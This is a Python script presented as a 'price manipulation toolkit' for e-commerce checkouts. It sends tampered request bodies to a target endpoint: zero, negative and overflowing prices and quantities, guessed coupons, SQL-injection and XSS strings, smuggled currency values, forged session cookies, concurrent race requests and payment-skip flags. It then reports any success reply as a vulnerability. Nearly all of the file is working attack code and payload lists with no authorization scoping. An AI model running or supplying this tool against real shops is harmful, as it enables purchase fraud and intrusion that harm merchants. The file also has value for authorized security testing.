#!/usr/bin/env python3
"""
price_manipulator_pro.py — Business Logic & Price Manipulation Toolkit.

Covers ALL major price/business logic attack vectors:
1. Body Parameter Tampering
2. Quantity Manipulation  
3. Coupon/Promo Abuse
4. Currency/Payment Manipulation
5. HTTP Parameter Pollution (HPP)
6. Session/State Manipulation
7. Race Conditions
8. Client-Side Price Override
9. Cart/Checkout Bypass
10. Integer Overflow/Underflow
11. Logic Flaw Chaining
12. Negative Pricing
"""
import requests
import json
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from urllib.parse import urljoin, parse_qs, urlparse


class PriceManipulator:
    """Test price manipulation vectors on e-commerce checkouts."""
    
    def __init__(self, base_url, session=None, proxy=None):
        self.base_url = base_url
        self.session = session or requests.Session()
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        self.results = []
        self.vulnerable = []

    # VECTOR 1: Body Price Tampering
    def test_body_price_tamper(self, endpoint, base_body, price_field="price"):
        """Tamper with price values in request body."""
        payloads = [
            {**base_body, price_field: 0},
            {**base_body, price_field: 0.01},
            {**base_body, price_field: -1},
            {**base_body, price_field: -100},
            {**base_body, price_field: "0"},
            {**base_body, price_field: "0.01"},
            {**base_body, price_field: "FREE"},
            {**base_body, price_field: None},
            {**base_body, price_field: ""},
            {**base_body, price_field: 999999999},
            {**base_body, price_field: 1e+308},
            {**base_body, price_field: float("inf")},
        ]
        results = []
        for payload in payloads:
            try:
                r = self.session.post(endpoint, json=payload)
                results.append({"payload": str(payload), "status": r.status_code, "response": r.text[:200]})
            except Exception as e:
                results.append({"payload": str(payload), "error": str(e)})
        return results

    # VECTOR 2: Quantity Manipulation
    def test_quantity_tamper(self, endpoint, base_body, qty_field="quantity"):
        payloads = [
            {**base_body, qty_field: 0},
            {**base_body, qty_field: -1},
            {**base_body, qty_field: -100},
            {**base_body, qty_field: 0.5},
            {**base_body, qty_field: 99999},
            {**base_body, qty_field: 2147483647},
            {**base_body, qty_field: -2147483648},
            {**base_body, qty_field: "0"},
            {**base_body, qty_field: "-1"},
            {**base_body, qty_field: "FREE"},
        ]
        results = []
        for payload in payloads:
            try:
                r = self.session.post(endpoint, json=payload)
                results.append({"payload": str(payload), "status": r.status_code})
            except Exception as e:
                results.append({"payload": str(payload), "error": str(e)})
        return results

    # VECTOR 3: Coupon/Promo Abuse
    def test_coupon_stacking(self, endpoint, base_body, coupon_field="coupon"):
        payloads = [
            {**base_body, coupon_field: ""},
            {**base_body, coupon_field: "test"},
            {**base_body, coupon_field: "admin"},
            {**base_body, coupon_field: "100OFF"},
            {**base_body, coupon_field: "%00"},
            {**base_body, coupon_field: "' OR '1'='1"},
            {**base_body, coupon_field: "<script>alert(1)</script>"},
            {**base_body, coupon_field: "SAVE50"},
            {**base_body, coupon_field: "FREE"},
            {**base_body, coupon_field: "ADMIN100"},
            {**base_body, coupon_field: ["SAVE10", "SAVE20"]},  # Array
            {**base_body, coupon_field: "100PERCENT"},
        ]
        results = []
        for payload in payloads:
            try:
                r = self.session.post(endpoint, json=payload)
                results.append({"payload": str(payload), "status": r.status_code})
            except Exception as e:
                results.append({"payload": str(payload), "error": str(e)})
        return results

    # VECTOR 4: Currency Manipulation
    def test_currency_tamper(self, endpoint, base_body, currency_field="currency"):
        payloads = [
            {**base_body, currency_field: "USD"},
            {**base_body, currency_field: "EUR"},
            {**base_body, currency_field: "BTC"},
            {**base_body, currency_field: "JPY"},
            {**base_body, currency_field: "VND"},
            {**base_body, currency_field: ""},
            {**base_body, currency_field: None},
            {**base_body, currency_field: "USD%00"},
            {**base_body, currency_field: "USD\ncurrency=BTC"},
            {**base_body, currency_field: "XXX"},
        ]
        results = []
        for payload in payloads:
            try:
                r = self.session.post(endpoint, json=payload)
                results.append({"payload": str(payload), "status": r.status_code})
            except Exception as e:
                results.append({"payload": str(payload), "error": str(e)})
        return results

    # VECTOR 5: HTTP Parameter Pollution
    def test_hpp(self, endpoint, base_body, target_param):
        results = []
        # Method 1: Duplicate in URL
        url_with_dup = f"{endpoint}?{target_param}=tampered"
        try:
            r = self.session.post(url_with_dup, json=base_body)
            results.append({"method": "URL duplicate", "status": r.status_code})
        except Exception as e:
            results.append({"error": str(e)})
        # Method 2: Both URL and body
        try:
            r = self.session.post(url_with_dup, json=base_body)
            results.append({"method": "URL+body", "status": r.status_code})
        except Exception as e:
            results.append({"error": str(e)})
        # Method 3: Array injection
        try:
            r = self.session.post(endpoint, json={**base_body, target_param: ["original", "tampered"]})
            results.append({"method": "Array", "status": r.status_code})
        except Exception as e:
            results.append({"error": str(e)})
        return results

    # VECTOR 6: Session Manipulation
    def test_session_manipulation(self, endpoint, base_body):
        results = []
        # Try with different session tokens
        original = self.session.cookies.get("session_id")
        for fake_session in ["", "admin", "0", "null", "undefined", "' OR '1'='1"]:
            self.session.cookies.set("session_id", fake_session)
            try:
                r = self.session.post(endpoint, json=base_body)
                results.append({"session_id": fake_session, "status": r.status_code})
            except Exception as e:
                results.append({"session_id": fake_session, "error": str(e)})
        if original:
            self.session.cookies.set("session_id", original)
        return results

    # VECTOR 7: Race Condition
    def test_race_condition(self, endpoint, base_body, threads=10):
        results = []
        def fire_request():
            r = self.session.post(endpoint, json=base_body)
            return r.status_code
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(fire_request) for _ in range(threads)]
            results = [{"thread": i, "status": f.result()} for i, f in enumerate(futures)]
        return results

    # VECTOR 8: Client-Side Price Override
    def test_client_side_price(self, url, price_field="price"):
        """Override client-side price calculation."""
        import re
        try:
            r = self.session.get(url)
            html = r.text
            # Find price patterns in HTML/JS
            price_pattern = rf'{price_field}["\s:=]+([0-9.]+)'
            matches = re.findall(price_pattern, html)
            return {"prices_found": matches[:10], "status": r.status_code}
        except Exception as e:
            return {"error": str(e)}

    # VECTOR 9: Cart/Checkout Bypass
    def test_cart_bypass(self, endpoint, base_body):
        payloads = [
            {**base_body, "step": "complete"},
            {**base_body, "checkout": True},
            {**base_body, "payment": "none"},
            {**base_body, "paid": True},
            {**base_body, "order_status": "complete"},
            {**base_body, "skip_payment": True},
        ]
        results = []
        for payload in payloads:
            try:
                r = self.session.post(endpoint, json=payload)
                results.append({"payload": str(payload), "status": r.status_code})
            except Exception as e:
                results.append({"payload": str(payload), "error": str(e)})
        return results

    # VECTOR 10: Integer Overflow
    def test_integer_overflow(self, endpoint, base_body, target_field):
        payloads = [
            {**base_body, target_field: 2147483647},      # Max 32-bit
            {**base_body, target_field: 2147483648},      # Overflow
            {**base_body, target_field: 4294967295},      # Max 64-bit
            {**base_body, target_field: 4294967296},      # Overflow
            {**base_body, target_field: 9223372036854775807},  # Max long
            {**base_body, target_field: -2147483648},     # Min 32-bit
            {**base_body, target_field: -2147483649},     # Underflow
        ]
        results = []
        for payload in payloads:
            try:
                r = self.session.post(endpoint, json=payload)
                results.append({"payload": str(payload), "status": r.status_code})
            except Exception as e:
                results.append({"payload": str(payload), "error": str(e)})
        return results

    # VECTOR 11: Logic Flaw Chaining
    def test_logic_chaining(self, endpoint, base_body, steps):
        """Chain multiple manipulations together."""
        results = []
        current_body = base_body.copy()
        for i, step in enumerate(steps):
            current_body.update(step)
            try:
                r = self.session.post(endpoint, json=current_body)
                results.append({"step": i, "payload": str(step), "status": r.status_code})
            except Exception as e:
                results.append({"step": i, "error": str(e)})
        return results

    # VECTOR 12: Negative Pricing
    def test_negative_pricing(self, endpoint, base_body):
        payloads = [
            {**base_body, "price": -0.01},
            {**base_body, "price": -1},
            {**base_body, "price": -99.99},
            {**base_body, "price": -999999},
            {**base_body, "total": -0.01},
            {**base_body, "total": -99.99},
            {**base_body, "discount": 200},  # 200% discount
            {**base_body, "discount": 10000},
        ]
        results = []
        for payload in payloads:
            try:
                r = self.session.post(endpoint, json=payload)
                results.append({"payload": str(payload), "status": r.status_code})
            except Exception as e:
                results.append({"payload": str(payload), "error": str(e)})
        return results

    def scan_all(self, endpoint, base_body):
        """Run ALL vectors against an endpoint."""
        print(f"[SCAN] Testing {endpoint} with {len(base_body)} base fields")
        all_results = {
            "body_price_tamper": self.test_body_price_tamper(endpoint, base_body),
            "quantity_tamper": self.test_quantity_tamper(endpoint, base_body),
            "coupon_stacking": self.test_coupon_stacking(endpoint, base_body),
            "currency_tamper": self.test_currency_tamper(endpoint, base_body),
            "session_manipulation": self.test_session_manipulation(endpoint, base_body),
            "cart_bypass": self.test_cart_bypass(endpoint, base_body),
        }
        return all_results

    def generate_report(self, results):
        """Generate a findings report."""
        report = {"total_tests": 0, "vulnerabilities": [], "summary": {}}
        for vector, tests in results.items():
            report["total_tests"] += len(tests)
            for t in tests:
                if t.get("status") in [200, 201, 302]:
                    report["vulnerabilities"].append({"vector": vector, **t})
        report["summary"] = {
            "total_tests": report["total_tests"],
            "vulnerable": len(report["vulnerabilities"]),
            "vectors_tested": list(results.keys())
        }
        return report


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Price Manipulation Toolkit")
    parser.add_argument("endpoint", help="Target endpoint URL")
    parser.add_argument("--body", default='{}', help="Base JSON body")
    parser.add_argument("--vectors", nargs="+", default=["all"], help="Vectors to test")
    args = parser.parse_args()

    p = PriceManipulator(args.endpoint)
    body = json.loads(args.body)
    results = p.scan_all(args.endpoint, body)
    report = p.generate_report(results)
    print(json.dumps(report, indent=2))
